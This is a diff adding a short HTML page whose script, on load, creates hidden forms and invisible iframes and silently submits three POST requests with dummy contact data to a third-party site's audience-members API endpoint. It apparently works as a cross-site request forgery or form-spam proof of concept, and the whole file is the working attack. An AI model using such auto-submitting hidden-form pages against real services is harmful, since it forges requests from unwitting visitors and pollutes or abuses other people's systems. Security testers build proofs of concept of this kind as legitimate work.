@@ -1,0 +1,46 @@
+<html>
+  <body>
+    <script>
+      const payloads = [
+        {
+          name: "test1",
+          email: "a@a.com",
+          phone: "111"
+        },
+        {
+          name: "test2",
+          email: "b@b.com",
+          phone: "222"
+        },
+        {
+          name: "test3",
+          email: "c@c.com",
+          phone: "333"
+        }
+      ];
+
+      payloads.forEach((p, i) => {
+        const form = document.createElement("form");
+        form.method = "POST";
+        form.action = "https://api.bio.site/api/v2/biosites/19fcf074-338b-4484-8580-9375dc4c1dc0/audience-members";
+        form.target = `frame${i}`;
+        form.enctype = "application/x-www-form-urlencoded";
+
+        const input = document.createElement("input");
+        input.type = "hidden";
+        input.name = "contact_info";
+        input.value = JSON.stringify(p);
+        form.appendChild(input);
+
+        const iframe = document.createElement("iframe");
+        iframe.name = `frame${i}`;
+        iframe.style.display = "none";
+        document.body.appendChild(iframe);
+
+        document.body.appendChild(form);
+        form.submit();
+      });
+    </script>
+  </body>
+</html>
+
